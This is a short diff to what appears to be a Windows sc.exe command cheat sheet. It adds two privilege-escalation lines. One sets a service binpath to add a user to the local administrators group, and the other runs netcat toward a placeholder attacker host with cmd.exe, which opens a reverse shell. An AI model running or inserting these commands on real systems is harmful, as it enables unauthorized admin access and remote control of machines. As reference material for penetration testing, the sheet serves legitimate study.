@@ -10,5 +10,7 @@ Query the current status of a service:
 `> sc.exe query <name>`
 Modify a configuration option of a service:
 `> sc.exe config <name> <option>= <value>`
+`> sc.exe config binpath= "net localgroup administrators user /add"` #add #group
+`> sc.exe config binpath= "C:\Temp\nc.exe ATACKER PORT -e cmd.exe"` #shell #remote
 Start/Stop a service:
 `> net start/stop <name>`
